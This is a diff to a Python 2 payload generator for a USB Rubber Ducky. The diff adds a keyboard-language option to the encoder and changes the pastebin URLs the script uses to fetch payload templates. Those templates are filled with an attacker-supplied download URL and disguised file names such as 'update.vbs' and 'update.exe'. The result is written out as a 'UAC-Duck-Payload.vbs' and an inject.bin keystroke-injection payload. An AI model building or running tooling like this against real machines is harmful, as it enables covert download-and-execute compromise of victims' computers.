@@ -12,7 +12,13 @@ def duckencode():
 		no = set(['no','n'])
 			
 		if yesno in yes:
-		   os.system("java -jar duckencoder.jar -i DuckyScript.txt -o inject.bin")
+		   
+			print "Input your keyboard lang, if empty English GB will be used (US, SE, FR etc (Without '-')?"
+			lang = raw_input().lower()
+			if not lang:
+				os.system("java -jar duckencoder.jar -i DuckyScript.txt -o inject.bin")
+			else: os.system("java -jar duckencoder.jar -i DuckyScript.txt -o inject.bin -l" + lang)
+			main()
 		elif yesno in no:
 		   main()	
 		else:
@@ -52,7 +58,7 @@ def genscripton():
 	if not genpayon_name:
 		print 'Using deafult params' 
 		with open('DuckyScript.txt', 'a') as the_file:
-			txt = urllib.urlopen("http://pastebin.com/raw/Gfie3EHU").read()
+			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
 			txt = txt.replace('[URL]', genpayon_url)
 			txt = txt.replace('[NAME]', "update.vbs")
 			the_file.write(txt)
@@ -60,7 +66,7 @@ def genscripton():
 		time.sleep(2)
 	elif genpayon_name.endswith(".vbs"):
 		with open('DuckyScript.txt', 'a') as the_file:
-			txt = urllib.urlopen("http://pastebin.com/raw/Gfie3EHU").read()
+			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
 			txt = txt.replace('[URL]', genpayon_url)
 			txt = txt.replace('[NAME]', genpayon_name)
 			the_file.write(txt)
@@ -92,7 +98,7 @@ def genpayon():
 		if not genpayon_name:
 			print 'Using deafult params' 
 			with open('UAC-Duck-Payload.vbs', 'a') as the_file:
-					txt = urllib.urlopen("http://pastebin.com/raw/jjcB4dJY").read()
+					txt = urllib.urlopen("http://pastebin.com/raw/tGeux7Yw").read()
 					txt = txt.replace('[URL]', genpayon_url)
 					txt = txt.replace('/[NAME]', "/update.exe")
 					the_file.write(txt)
@@ -101,7 +107,7 @@ def genpayon():
 		elif genpayon_name.endswith(".exe"):
 			
 			with open('UAC-Duck-Payload.vbs', 'a') as the_file:
-				txt = urllib.urlopen("http://pastebin.com/raw/jjcB4dJY").read()
+				txt = urllib.urlopen("http://pastebin.com/raw/tGeux7Yw").read()
 				txt = txt.replace('[URL]', genpayon_url)
 				txt = txt.replace('/[NAME]', "/" + genpayon_name)
 				the_file.write(txt)
